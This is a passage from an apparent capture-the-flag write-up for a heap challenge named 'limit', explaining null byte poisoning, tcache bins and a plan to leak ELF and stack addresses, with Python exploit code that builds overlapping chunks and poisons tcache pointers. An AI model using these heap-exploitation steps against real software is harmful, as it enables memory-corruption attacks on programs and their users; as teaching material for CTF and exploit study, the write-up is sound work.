</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;libc.address = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><hr>
<h2 class="heading-element" id="can-we-pwn-it-now"><span>Can We Pwn It Now?</span>
  <a href="#can-we-pwn-it-now" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p float="left">
  <img src="http://localhost:1313/d1ff/images_limit/a3233e72-527b-4382-be14-7a3c8f08fdf1.png" width="300"/>
  <img src="http://localhost:1313/d1ff/images_limit/66b399b8-651b-4ed0-a8a0-a2a3505de317.png" width="300"/>
</p>
<!-- ![pwnit2.png](/d1ff/images_limit/a3233e72-527b-4382-be14-7a3c8f08fdf1.png) -->
<!-- ![pwnit2.png](/d1ff/images_limit/66b399b8-651b-4ed0-a8a0-a2a3505de317.png) --> 
<p>Not quite — at least, <strong>not yet</strong>. The reason lies in the <strong><code>limit</code></strong> condition: we’re restricted from writing to any memory <strong>above</strong> the <code>limit</code> pointer. However, anything <strong>below</strong> it is fair game.</p>
<p>To understand our options, let’s take a look at the <strong>virtual memory layout</strong>:</p>
<p><img loading="lazy" src='http://localhost:1313/d1ff/images_limit/image.png' alt="image.png"></p>
<p>As shown above, the entire ELF binary — including its <code>.data</code> section — resides at a <strong>lower address</strong> than the heap. That means the <code>.data</code> section is within our writable range, and that’s a big opportunity.</p>
<aside>
💡
<p>But how does that help?</p>
<p>Well, imagine if we could allocate a chunk <strong>on the <code>chunks</code> pointer array itself</strong> in the <code>.data</code> section. Then, we could write arbitrary pointers into the <code>chunks</code> table. Since reading and writing from/into a chunk only requires a valid pointer at that index, we’d gain the ability to arbitrary read and write at any location.</p>
</aside>
<p>However, there&rsquo;s a catch: to pull this off, we need the <strong><code>ELF base address</code></strong> too.</p>
<p>But before diving into ELF leaks,  let us understand how to utilize the <strong><code>null byte overflow</code></strong> bug.</p>
<hr>
<h2 class="heading-element" id="null-byte-poisoning"><span>Null Byte Poisoning</span>
  <a href="#null-byte-poisoning" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>A <strong>single null byte overflow</strong> on the heap might seem small, but — it holds the power to give us an <strong>overlapping chunk.</strong>
With overlapping chunks, we can exploit a classic vulnerability: <strong>Use-After-Free (UAF)</strong>.</p>
<p>For this part, I’ve mostly followed a well-known proof of concept by <strong>Shellphish</strong> (the legends themselves) →   <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/poison_null_byte.c"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/shellphish/how2heap/blob/master/glibc_2.35/poison_null_byte.c</a></p>
<p><em>If you&rsquo;re not in the mood to dig into the inner workings of the null byte overflow, that&rsquo;s alright — feel free to move on. Just know that it effectively provides us UAF on a freed chunk.</em></p>
<h3 class="heading-element" id="chunk-metadata"><span><a href="https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/malloc/malloc.c#L1128"target="_blank" rel="external nofollow noopener noreferrer">Chunk Metadata</a></span>
  <a href="#chunk-metadata" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><img loading="lazy" src='http://localhost:1313/d1ff/images_limit/chunk-allocated-CS.png' alt="Chunk metadata by Azeria Labs "></p>
<p>Chunk metadata by Azeria Labs</p>
<p>Now, The important part  for null byte poisoning are :-</p>
<ul>
<li><strong><code>prev_inuse</code> Bit</strong> → This flag, stored in the least significant bit of a chunk&rsquo;s size field, indicates whether the <strong>previous chunk is in use</strong>. It is set to <code>1</code> for allocated chunks, tcache, and fastbin-freed chunks, and set to <code>0</code> when the previous chunk is in the <strong>unsorted or large bin</strong> (i.e., truly freed). This bit helps the heap manager decide whether it can <strong>coalesce</strong> adjacent free chunks.</li>
<li><strong><code>prev_size</code> Field</strong> → When the <code>prev_inuse</code> bit is <code>0</code> (i.e., the previous chunk is freed), this field stores the <strong>size of the previous free chunk</strong>. It’s used during coalescing to correctly locate and merge neighboring chunks.</li>
</ul>
<h3 class="heading-element" id="how-coalescing-is-performed"><span><a href="https://elixir.bootlin.com/glibc/glibc-2.3/source/malloc/malloc.c#L4102"target="_blank" rel="external nofollow noopener noreferrer">How coalescing is performed?</a></span>
  <a href="#how-coalescing-is-performed" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Whenever a chunk is freed into the <strong>unsorted bin</strong> or any <strong>coalescing bin</strong>, the heap manager first checks the <strong><code>prev_inuse</code></strong> bit to see if the <strong>previous chunk is also free</strong>.</p>
<p>If so, it will <strong>coalesce</strong> (i.e., merge) the two chunks into a <strong>single larger free chunk</strong>, optimizing memory and reducing fragmentation.</p>
<p>lets see it in visuals</p>
<p><img loading="lazy" src='http://localhost:1313/d1ff/images_limit/finalnull.gif' alt="finalnull.gif"></p>
<p><strong>Getting Overlapping Chunk</strong></p>
<p>Now, using an <strong>off-by-null</strong> overflow, we can <strong>clear the <code>prev_inuse</code> bit</strong> of the next chunk without actually freeing the previous one. This tricks the heap into thinking that the previous chunk is free — even though it’s still allocated.</p>
<p>So, when we later <strong>free the next (adjacent) chunk</strong>, the heap checks the <code>prev_inuse</code> bit, sees it as <code>0</code>, and <strong>attempts to coalesce</strong> it with the &ldquo;previous&rdquo; chunk — which we never actually freed. As a result, the allocator merges them into one large chunk.</p>
<p>Now, if we free the <strong>real middle chunk</strong>, and then allocate a new chunk that fits the entire merged region, it will overlap with the recently free middle chunk. <strong>Hence, Providing <code>UAF</code> on it.</strong></p>
<p>image</p>
<p><strong>Note:</strong> The explanation above provides a <strong>high-level overview</strong> of the <strong>Null Byte Poisoning</strong> technique. When crafting a full exploit, you&rsquo;ll need to carefully account for all the <strong>heap integrity checks</strong> performed during <code>free()</code>, as well as perform some strategic <a href="https://en.wikipedia.org/wiki/Heap_feng_shui"target="_blank" rel="external nofollow noopener noreferrer"><strong>heap feng shui</strong></a> to align your chunks just right and achieve the desired overlap.</p>
<p><em>For a deeper understanding of the exploit’s implementation, <strong>Shellphish</strong> and others have provided excellent POC and write-ups  — check them out in the <strong>Resources</strong> section at the end!</em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">obfuscate</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x100</span><span class="p">,</span><span class="n">heap_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x38</span><span class="p">)</span>  <span class="c1">#### a</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0xca0</span>
</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="n">offset</span>
</span></span><span class="line"><span class="cl"><span class="n">write_into</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">address</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x28</span><span class="p">)</span> <span class="c1">#### b</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span> <span class="c1">#### c</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="mi">24</span><span class="p">)</span>  <span class="c1">################## seperate from top_chunk</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">write_into</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x28</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="mh">0x60</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="mh">0xd8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span><span class="mh">0x28</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">write_into</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">target</span><span class="p">)[:</span><span class="mi">7</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span><span class="mh">0x28</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><hr>
<h2 class="heading-element" id="getting-elf-leak"><span>Getting ELF Leak</span>
  <a href="#getting-elf-leak" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><em>The caffeine from my coffee had long worn off, and frustration started to kick in as I kept hitting a wall trying to figure out how to get the <code>ELF leak</code>. So, I called it a night and went to bed.</em></p>
<p><em>But my subconcious brain wasn’t done yet.</em></p>
<img src="http://localhost:1313/d1ff/images_limit/sleepingbrain.png" width="300" style="display: block; margin: auto;"  />
<!-- ![sleepingbrain.png](/d1ff/images_limit/sleepingbrain.png) -->
<p>We still don’t have the <strong>ELF base address</strong>, which means we <strong><code>can’t yet allocate</code> a chunk over the <code>.data</code> section</strong> — and with the <code>limit</code> still enforcing boundaries, we’re restricted to playing within the <strong>heap region</strong> only.</p>
<p>But it’s time for a little <strong>act of chicanery</strong>. By carefully leveraging some behavior of <code>malloc</code> along with the bug we encountered in <a href="https://anony6174.github.io/d1ff/posts/smiley_writeup/limit/#case-1-malloc-up-to-0x100-bytes"target="_blank" rel="external nofollow noopener noreferrer"><strong>Case 1</strong></a>, we’re about to <strong>trick our way to an ELF leak.</strong></p>
<h3 class="heading-element" id="-tcache-bins"><span>📦 Tcache Bins</span>
  <a href="#-tcache-bins" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><strong>Tcache</strong>, short for <strong>Thread-Local Caching</strong>, was introduced in <strong>glibc 2.26+</strong> to make memory allocation and deallocation way faster and smoother.</p>
<p>Before tcache, freed chunks would go directly into <code>fastbins, small bins, or unsorted bins,</code> which are shared across threads. This caused <strong>lock contention</strong> and reduced performance in multi-threaded applications.</p>
<p>With tcache, each thread has its own private cache of freed chunks, making allocation and deallocation faster and lock-free (*most of the time).</p>
<p><strong>Tcache bins</strong> are <strong>arrays of singly-linked lists</strong>, where each bin holds freed chunks of a specific size class.</p>
<p>Each bin can store <strong>up to 7 chunks</strong> (by default) of a particular size.</p>
<p>When you <code>free()</code> a chunk that fits in tcache:</p>
<ul>
<li>If the corresponding bin is not full, the chunk is added to the front of the list.</li>
<li>If it <em>is</em> full, it falls back to fastbin or other bins.</li>
</ul>
<p>Now, every chunk that gets freed into <strong>tcache</strong> carries a <strong>forward pointer (<code>fd</code>)</strong> that points to the <strong>next available chunk</strong> in the same size class. The <strong>tcache bin</strong> for that size keeps track of the <strong>most recently freed chunk</strong> — basically the head of the linked list.</p>
<p><img loading="lazy" src='http://localhost:1313/d1ff/images_limit/tcache-Pica.png' alt="tcache-Pica.png"></p>
<p>So, when you <code>malloc(sz)</code>, the allocator first checks the tcache bin for size <code>sz</code>. If a chunk is available, it simply pops it off the list and returns it. The <code>fd</code> of that chunk (i.e., the next chunk in line) becomes the new head of the bin.</p>
<h3 class="heading-element" id="leaking-elf-address"><span>Leaking Elf Address</span>
  <a href="#leaking-elf-address" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>The <strong>tcache bin array</strong> resides within the <strong>thread-local <a href="https://elixir.bootlin.com/glibc/glibc-2.39.9000/source/malloc/malloc.c#L3118"target="_blank" rel="external nofollow noopener noreferrer"><code>tcache_perthread_struct</code></a></strong>, which is usually located at the <strong>start of the heap</strong> for the main thread. It contains multiple bins (one for each size class), and each bin holds a singly-linked list of freed chunks of a specific size.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp"># define TCACHE_FILL_COUNT 7
</span></span></span><span class="line"><span class="cl"><span class="cp"># define TCACHE_MAX_BINS 64
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">/////////////////////// STRUCTURE //////////////////////////////
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_perthread_struct</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint16_t</span> <span class="n">counts</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">entries</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">tcache_perthread_struct</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">__thread</span> <span class="kt">bool</span> <span class="n">tcache_shutting_down</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">__thread</span> <span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="n">tcache</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">////////////////////////// OPERATION //////////////////////////
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"> <span class="cm">/* Caller must ensure that we know tc_idx is valid and there&#39;s room
</span></span></span><span class="line"><span class="cl"><span class="cm">    for more chunks.  */</span>
</span></span><span class="line"><span class="cl"> <span class="k">static</span> <span class="kt">void</span>
</span></span><span class="line"><span class="cl"> <span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="nf">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="nf">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">   <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="cm">/* Caller must ensure that we know tc_idx is valid and there&#39;s
</span></span></span><span class="line"><span class="cl"><span class="cm">    available chunks to remove.  */</span>
</span></span><span class="line"><span class="cl"> <span class="k">static</span> <span class="kt">void</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"> <span class="nf">tcache_get</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">   <span class="nf">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="nf">assert</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="cm">/*  *Recent versions of libc have introduced several new mechanisms and security
</span></span></span><span class="line"><span class="cl"><span class="cm">  checks related to tcache management, which are not shown above for the sake of 
</span></span></span><span class="line"><span class="cl"><span class="cm">  simplicity.*   */</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Now here’s the trick: if you manage to <strong>allocate a chunk over the tcache bin array itself</strong> — which lives in the <code>.data</code> section of the heap — you gain the ability to <strong>control the head of the linked list</strong> for any size class. This means you can essentially dictate <strong>what pointer malloc will return next</strong> when that size is requested.</p>
<p>However, we face a constraint — we can’t read from or write to memory <strong>beyond the <code>limit</code> pointer</strong>, but we <strong>can still allocate chunks</strong> there. This is important: although we can&rsquo;t directly interact with memory past <code>limit</code>, we can still influence allocator behavior by setting things up just right.</p>
<p>Now, here’s where it gets fun.</p>
<p>When you allocate a chunk of a certain size and the corresponding <strong>tcache bin</strong> has <strong>at least two chunks</strong>, malloc:</p>
<ol>
<li>Pops the <strong>head</strong> of the bin,</li>
<li>Updates the bin’s head to the value stored in the <code>fd</code> field of the freed chunk (which is located just after the size field in the chunk metadata).</li>
</ol>
<img src="http://localhost:1313/d1ff/images_limit/tcache_bins.gif" width="700" style="display: block; margin: auto;"  />
<p>So if that <code>fd</code> field (the forward pointer) lies in memory <strong>past the <code>limit</code></strong>, we can’t inspect it directly — but <strong>malloc will still read it and update the bin head</strong>, trusting the value that’s stored there. And then we simply <strong>print the content</strong> of the chunk (one which is allocated on tcache_bin itself)!</p>
<p>We exploit this behavior to leak a <strong>stack address</strong>, which we know can often be found in the <strong>libc data section</strong>. (I looked through the data section and didn&rsquo;t find any ELF pointers directly, but I did find <strong>stack pointers</strong>.)</p>
<p><em>Here’s the catch: in modern glibc versions, <strong>tcache pointers are obfuscated</strong> for security. The <code>fd</code> pointer is XOR’d with a per-process secret when stored. So when glibc wants to update the bin head, it <strong>de-obfuscates</strong> the value using this secret before using it.</em></p>
